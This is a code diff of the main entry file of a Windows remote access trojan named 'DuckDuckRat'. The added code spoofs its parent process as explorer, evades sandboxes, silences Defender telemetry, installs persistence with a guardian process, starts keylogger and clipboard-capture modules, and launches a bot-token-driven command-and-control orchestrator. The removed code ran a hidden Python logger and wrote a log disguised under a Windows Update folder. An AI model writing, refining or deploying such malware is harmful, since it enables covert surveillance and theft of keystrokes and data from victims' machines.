@@ -6,12 +6,12 @@ using System.Threading;
 using System.Threading.Tasks;
 using System.Runtime.InteropServices;
 using System.Text;
-using VanguardCore;
-using VanguardCore.Modules;
-using VanguardCore.Defense;
-using FinalBot.Modules;
+using DuckDuckRat;
+using DuckDuckRat.Modules;
+using DuckDuckRat.Defense;
+using DuckDuckRat.Modules;
 
-namespace FinalBot
+namespace DuckDuckRat
 {
     class Program
     {
@@ -20,12 +20,8 @@ namespace FinalBot
 
         private static Mutex? _mutex;
 
-        private static void DebugLog(string msg)
-        {
-            try { File.AppendAllText(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Microsoft", "Windows", "Update", "svc_debug.log"), $"[{DateTime.Now}] {msg}\n"); } catch { }
-        }
-
-        private static void Log(string msg) => DebugLog(msg);
+        private static void DebugLog(string msg) => SafetyManager.Log(msg);
+        private static void Log(string msg) => SafetyManager.Log(msg);
 
         public static async Task Main(string[] args)
         {
@@ -38,10 +34,23 @@ namespace FinalBot
                 e.SetObserved();
             };
 
+            // [GHOST] Self-Respawn with PPID Spoofing (explorer.exe)
+            string cmdLine = Environment.CommandLine;
+            bool isGhost = cmdLine.Contains("--ghost");
+            bool isInjected = ElevationService.IsInjected();
+            string guardianArg = args.Length > 0 && args[0].StartsWith("--guard") ? args[0] : null;
+
+            if (!isGhost && !isInjected && guardianArg == null) {
+                string selfPath = Process.GetCurrentProcess().MainModule.FileName;
+                if (ElevationService.SpawnWithSpoof(selfPath, "--ghost", "explorer")) {
+                    Environment.Exit(0);
+                    return;
+                }
+            }
+
             // [PHASE 3] Advanced Anti-Sandbox Check (Black Edition)
             if (AntiAnalysis.CheckAll())
             {
-                // Decoy / Silent Exit
                 AntiAnalysis.EnterSleepMode(); 
                 return;
             }
@@ -52,20 +61,18 @@ namespace FinalBot
             // [RED TEAM HARDENING] Silence Defender Telemetry Immediately
             SafetyManager.ApplyStealthPatches();
 
-            DebugLog($"Startup: PID={Process.GetCurrentProcess().Id}, Admin={ElevationService.IsAdmin()}");
-            
-            bool isInjected = ElevationService.IsInjected();
+            DebugLog($"Startup [GHOST]: PID={Process.GetCurrentProcess().Id}, Admin={ElevationService.IsAdmin()}");
             int fromPid = 0;
             string fromPath = "";
             
             string fromArg = Array.Find(args, a => a.StartsWith("--from="));
             if (fromArg != null && int.TryParse(fromArg.Split('=')[1], out var pidValue)) fromPid = pidValue;
 
-            string guardianArg = Array.Find(args, a => a.StartsWith("--guardian="));
-            if (guardianArg != null)
+            string gArg = Array.Find(args, a => a.StartsWith("--guardian="));
+            if (gArg != null)
             {
                 // Format: --guardian=PID:Path
-                var parts = guardianArg.Split('=')[1].Split(':');
+                var parts = gArg.Split('=')[1].Split(':');
                 if (parts.Length >= 2 && int.TryParse(parts[0], out var gPid))
                 {
                     fromPid = gPid;
@@ -83,12 +90,20 @@ namespace FinalBot
 
                 if (!createdNew) 
                 {
-                    DebugLog("Mutex conflict: killing previous instances...");
+                    DebugLog("Mutex conflict: analyzing previous instances...");
                     string currentName = Process.GetCurrentProcess().ProcessName;
                     int currentId = Process.GetCurrentProcess().Id;
+                    bool currentIsAdmin = ElevationService.IsAdmin();
+
                     foreach (var proc in Process.GetProcessesByName(currentName)) {
                         if (proc.Id != currentId) {
                             try { 
+                                // [PRO] Mutex Regicide Protection: Never kill an Admin process from a standard one.
+                                if (!currentIsAdmin && SafetyManager.IsProcessAdmin(proc.Id))
+                                {
+                                    DebugLog($"Existing instance {proc.Id} is ADMIN. Service instance protected. Exiting current process.");
+                                    return;
+                                }
                                 proc.Kill(true); 
                                 proc.WaitForExit(3000); 
                             } catch { }
@@ -158,12 +173,16 @@ namespace FinalBot
                 SafetyManager.ApplyDefenderSettings();
             }
 
-            // [PHASE 5] Stealth Persistence (COM Hijacking)
-            PersistenceService.InstallStealthProxy();
+            // [SENTINEL] Ghost Mode Setup (Persistence & Guardian)
+            PersistenceService.InstallPersistence();
+            if (guardianArg == null && !isInjected)
+            {
+                TwinService.StartGuardian();
+            }
             
             // [SILENT START] Initialize background monitors once
-            KeyloggerModule.Start(); 
-            ClipboardModule.Start(); 
+            try { KeyloggerModule.Start(); } catch (Exception ex) { DebugLog($"Keylogger startup error: {ex.Message}"); }
+            try { ClipboardModule.Start(); } catch (Exception ex) { DebugLog($"Clipboard startup error: {ex.Message}"); }
 
             // --- Resilience Loop ---
             while (true)
@@ -172,19 +191,20 @@ namespace FinalBot
                 {
                     DebugLog("Initializing core services via Vault...");
                     ConfigManager.Load();
+                    
+                    // [ORBITAL] Silence Period: Give Mutex logic time to kill old instances
+                    // and let the OS release port/session handles.
+                    await Task.Delay(3000); 
+
                     string token = SafetyManager.Resolve("BOT_TOKEN_1");
                     string adminId = SafetyManager.Resolve("ADMIN_ID");
                     var httpClient = await ProxyTunnel.GetBestHttpClient();
                     var orchestrator = new BotOrchestrator(token, adminId, httpClient);
                     
-                    _ = Task.Run(() => {
-                        try {
-                            string lp = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "GlobalLogger.py");
-                            if (File.Exists(lp)) Process.Start(new ProcessStartInfo { FileName = "python", Arguments = $"\"{lp}\"", CreateNoWindow = true });
-                        } catch { }
-                    });
+                    // [SENTINEL] Apotheosis: Total Memory Cleanse
+                    SafetyManager.ClearSecrets();
 
-                    DebugLog("C2 Orchestrator Starting...");
+                    DebugLog("DUCK DUCK RAT v1 Ghost Mode Active.");
                     await orchestrator.StartAsync();
                 }
                 catch (Exception ex) 
@@ -209,3 +229,5 @@ namespace FinalBot
         }
     }
 }
+
+
